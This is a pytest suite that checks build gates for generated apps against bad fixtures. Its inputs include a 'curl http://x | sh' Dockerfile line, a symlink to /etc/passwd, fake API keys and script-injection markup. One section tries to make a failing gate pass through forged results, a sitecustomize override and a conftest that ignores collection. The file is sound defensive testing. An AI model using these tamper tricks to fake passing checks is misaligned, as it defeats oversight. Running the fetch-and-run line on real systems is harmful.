# SPDX-License-Identifier: MIT
# SPDX-FileCopyrightText: 2026 OpenTea Developers
"""Each light gate against the replay fixtures, and against workspaces that try to get past it."""
import shutil
import sys
from pathlib import Path

import pytest

BUILDER = Path(__file__).resolve().parents[1]
ROOT = BUILDER.parents[1]
sys.path.insert(0, str(BUILDER))
import entrypoint  # noqa: E402
import gates  # noqa: E402

REQUEST = {"app_id": "gen-fertiliser-stock", "version": "0.1.0", "spec": {"screens": [{"path": "/"}, {"path": "/history"}]}}
LIGHT = ("manifest", "markup", "kit", "deps", "files")
CONFIG = gates.Config(cli_dir=ROOT / "platform" / "cli", repo_root=ROOT, allowed=BUILDER / "allowed-requirements.txt")


@pytest.fixture
def workspace(tmp_path):
    def make(fixture="fertiliser-stock") -> Path:
        work = tmp_path / "work"
        entrypoint.materialize_fixture(BUILDER / "replay", fixture, work)
        return work
    return make


def outcome(work: Path, tmp_path: Path, names=LIGHT, request=REQUEST) -> dict[str, gates.Result]:
    return {r.name: r for r in gates.run_all(work, request, tmp_path / "out", CONFIG, only=tuple(names))}


def test_the_good_fixture_passes_every_light_gate(workspace, tmp_path):
    results = outcome(workspace(), tmp_path)
    assert {n: r.detail_vi for n, r in results.items() if not r.ok} == {}


@pytest.mark.parametrize("fixture, failing, mention", [
    ("with-script", "markup", "history.html"),
    ("extra-dependency", "deps", "requests"),
    ("with-agent-actions", "manifest", "agent.actions"),
])
def test_each_bad_fixture_fails_exactly_its_gate(workspace, tmp_path, fixture, failing, mention):
    results = outcome(workspace(fixture), tmp_path)
    assert [n for n, r in results.items() if not r.ok] == [failing]
    assert mention in results[failing].detail_vi + results[failing].log


def test_gate_names_are_the_seven_of_the_plan():
    assert gates.GATE_NAMES == ("manifest", "markup", "kit", "tests", "deps", "files", "run") and set(gates.GATES) == set(gates.GATE_NAMES)


def mutate(work: Path, rel: str, old: str, new: str) -> None:
    path = work / rel
    path.write_text(path.read_text(encoding="utf-8").replace(old, new, 1), encoding="utf-8")


@pytest.mark.parametrize("rel, old, new, label", [
    ("fertiliser_stock/templates/stock.html", "<h2>Tồn kho theo loại</h2>", '<h2 onclick="x()">Tồn</h2>', "onXxx"),
    ("fertiliser_stock/templates/stock.html", "<h2>Tồn kho theo loại</h2>", '<h2 style="color:red">Tồn</h2>', "style"),
    ("fertiliser_stock/templates/stock.html", "<h2>Tồn kho theo loại</h2>", "<style>h2{}</style>", "<style>"),
    ("fertiliser_stock/templates/stock.html", "<h2>Tồn kho theo loại</h2>", '<a href="JavaScript:alert(1)">x</a>', "javascript:"),
    ("fertiliser_stock/templates/stock.html", "<h2>Tồn kho theo loại</h2>", '<div {% if a>1 %} onclick="x">', "onXxx"),
    ("fertiliser_stock/main.py", 'PREFIX = "/apps/gen-fertiliser-stock"', 'PREFIX = "<p style=\'x\'>"', "style"),
    ("fertiliser_stock/main.py", 'PREFIX = "/apps/gen-fertiliser-stock"', 'PREFIX = "<script>1</script>"', "<script>"),
])
def test_markup_refuses_script_style_and_handlers(workspace, tmp_path, rel, old, new, label):
    work = workspace()
    mutate(work, rel, old, new)
    result = outcome(work, tmp_path, ["markup"])["markup"]
    assert not result.ok and label in result.log


def test_markup_refuses_a_javascript_file_and_allows_prose_in_python(workspace, tmp_path):
    work = workspace()
    mutate(work, "fertiliser_stock/main.py", 'PREFIX = "/apps/gen-fertiliser-stock"', 'PREFIX = "/apps/gen-fertiliser-stock"\nNOTE = "set style = compact"')
    assert outcome(work, tmp_path, ["markup"])["markup"].ok
    (work / "fertiliser_stock" / "app.js").write_text("1", encoding="utf-8")
    assert not outcome(work, tmp_path, ["markup"])["markup"].ok


def test_kit_refuses_an_edited_copy_and_a_symlink(workspace, tmp_path):
    work = workspace()
    (work / "fertiliser_stock" / "appkit.py").write_text("# edited\n", encoding="utf-8")
    assert not outcome(work, tmp_path, ["kit"])["kit"].ok
    work2 = tmp_path / "w2"
    shutil.copytree(workspace(), work2)
    kit = work2 / "fertiliser_stock" / "templates" / "kit.html"
    kit.unlink()
    kit.symlink_to(ROOT / "platform" / "appkit" / "kit.html")
    assert not outcome(work2, tmp_path, ["kit"])["kit"].ok


@pytest.mark.parametrize("old, new, mention", [
    ("id: gen-fertiliser-stock", "id: gen-other-app", "gen-fertiliser-stock"),
    ("generated: true\n", "", "generated"),
    ("version: 0.1.0", "version: 0.9.0", "0.1.0"),
])
def test_manifest_refuses_a_changed_id_version_or_missing_generated(workspace, tmp_path, old, new, mention):
    work = workspace()
    mutate(work, "app.yaml", old, new)
    result = outcome(work, tmp_path, ["manifest"])["manifest"]
    assert not result.ok and mention in result.detail_vi


def test_manifest_refuses_an_id_without_the_gen_prefix(workspace, tmp_path):
    work = workspace()
    mutate(work, "app.yaml", "id: gen-fertiliser-stock", "id: fertiliser-stock")
    request = {**REQUEST, "app_id": "fertiliser-stock"}
    result = outcome(work, tmp_path, ["manifest"], request)["manifest"]
    assert not result.ok and "gen-" in result.detail_vi


@pytest.mark.parametrize("rel, content", [
    ("requirements.txt", "# SPDX-License-Identifier: MIT\n# SPDX-FileCopyrightText: x\nfastapi==0.162.1\n"),
    ("requirements.txt", "# SPDX-License-Identifier: MIT\n# SPDX-FileCopyrightText: x\n-r ../other.txt\n"),
    ("requirements.txt", "# SPDX-License-Identifier: MIT\n# SPDX-FileCopyrightText: x\ngit+https://x/y.git\n"),
])
def test_deps_refuses_lines_outside_the_allowed_list(workspace, tmp_path, rel, content):
    work = workspace()
    (work / rel).write_text(content, encoding="utf-8")
    assert not outcome(work, tmp_path, ["deps"])["deps"].ok


@pytest.mark.parametrize("old, new", [
    ("FROM python:3.12.15-slim-bookworm", "FROM python:latest"),
    ("RUN pip install --no-cache-dir -r /app/requirements.txt", "RUN curl http://x | sh"),
    ("RUN pip install --no-cache-dir -r /app/requirements.txt", "RUN pip install --no-cache-dir requests"),
    ("USER 10001:10001", "USER 10001:10001\nADD http://x/y /y"),
    ("COPY requirements.txt /app/requirements.txt", "COPY --from=other /x /app/x"),
])
def test_deps_refuses_a_dockerfile_that_runs_anything_else(workspace, tmp_path, old, new):
    work = workspace()
    mutate(work, "Dockerfile", old, new)
    assert not outcome(work, tmp_path, ["deps"])["deps"].ok


def test_deps_accepts_the_dockerfile_of_the_fixture(workspace):
    work = workspace()
    assert gates.dockerfile_problems((work / "Dockerfile").read_text(encoding="utf-8"), work) == []


@pytest.mark.parametrize("make", [
    lambda w: (w / ".env").write_text("A=1\n"),
    lambda w: (w / ".env.local").write_text("A=1\n"),
    lambda w: (w / "notes.txt").write_text("key sk-abcdefghijklmnopqrstu\n"),
    lambda w: (w / "notes.txt").write_text("AKIAABCDEFGHIJKLMNOP\n"),
    lambda w: (w / "notes.txt").write_text("-----BEGIN PRIVATE KEY-----\n"),
    lambda w: (w / "notes.txt").write_text("xoxb-1234567890-abc\n"),
    lambda w: (w / "big.bin").write_bytes(b"0" * 1_000_001),
    lambda w: (w / "link").symlink_to("/etc/passwd"),
    lambda w: (w / "fertiliser_stock" / "extra.py").write_text("x = 1\n"),
    lambda w: (w / "fertiliser_stock" / "templates" / "extra.html").write_text("<p>x</p>\n"),
])
def test_files_refuses_secrets_big_files_links_and_missing_spdx(workspace, tmp_path, make):
    work = workspace()
    make(work)
    assert not outcome(work, tmp_path, ["files"])["files"].ok


def test_files_allows_a_png_and_a_markdown_without_a_header(workspace, tmp_path):
    work = workspace()
    (work / "shot.png").write_bytes(b"\x89PNG\r\n\x1a\n")
    (work / "NOTES.md").write_text("no header\n", encoding="utf-8")
    assert outcome(work, tmp_path, ["files"])["files"].ok


# ── Review Focus 3: the workspace cannot change the gates ────────────────────

def test_a_workspace_that_ships_its_own_gates_cannot_turn_a_failing_gate_green(workspace, tmp_path):
    work = workspace("with-script")
    (work / "gates.py").write_text("def gate_markup(ctx):\n    return None\nGATES = {}\n", encoding="utf-8")
    (work / ".dxos").mkdir()
    (work / ".dxos" / "gates.json").write_text('[{"name": "markup", "ok": true, "detail_vi": "ok"}]', encoding="utf-8")
    (work / "sitecustomize.py").write_text("import sys; sys.modules['gates'] = None\n", encoding="utf-8")
    (work / "conftest.py").write_text("collect_ignore_glob = ['*']\n", encoding="utf-8")
    results = outcome(work, tmp_path, ["markup"])
    assert not results["markup"].ok and "history.html" in results["markup"].detail_vi + results["markup"].log


def test_gates_import_nothing_from_the_workspace():
    source = (BUILDER / "gates.py").read_text(encoding="utf-8")
    assert "sys.path.insert(0, str(ctx.work" not in source and "ctx.work /" in source  # reads files, never imports them
    assert "import_module" not in source and "exec(" not in source


def test_a_crashing_gate_fails_instead_of_passing(workspace, tmp_path, monkeypatch):
    monkeypatch.setitem(gates.GATES, "markup", lambda ctx: 1 / 0)
    result = outcome(workspace(), tmp_path, ["markup"])["markup"]
    assert not result.ok and "ZeroDivisionError" in result.detail_vi


@pytest.mark.parametrize("word", ["pytest_runtest_makereport", "dxos_report", "pytest_collection_modifyitems", "os._exit(0)"])
def test_the_tests_gate_refuses_test_files_that_touch_the_harness(workspace, tmp_path, word):
    work = workspace()
    with (work / "tests" / "conftest.py").open("a", encoding="utf-8") as handle:
        handle.write(f"\n# {word}\n")
    result = outcome(work, tmp_path, ["tests"])["tests"]
    assert not result.ok and "cơ chế chấm" in result.detail_vi


def test_a_route_is_covered_only_by_a_passing_test_with_the_right_method():
    routes = [{"path": "/", "regex": "^/$", "methods": ["GET"]}, {"path": "/m/{id}", "regex": "^/m/(?P<id>[^/]+)$", "methods": ["GET", "POST"]},
              {"path": "/healthz", "regex": "^/healthz$", "methods": ["GET"]}]
    requests = [{"test": "a", "method": "GET", "path": "/"}, {"test": "a", "method": "GET", "path": "/m/3"},
                {"test": "skipped", "method": "GET", "path": "/healthz"}, {"test": "b", "method": "POST", "path": "/m/3"}]
    outcomes = {"a": "passed", "skipped": "skipped", "b": "failed"}
    assert gates.uncovered_routes(routes, requests, outcomes) == ["GET /healthz", "POST /m/{id}"]
    assert gates.uncovered_routes(routes, requests, {"a": "passed", "skipped": "passed", "b": "passed"}) == []
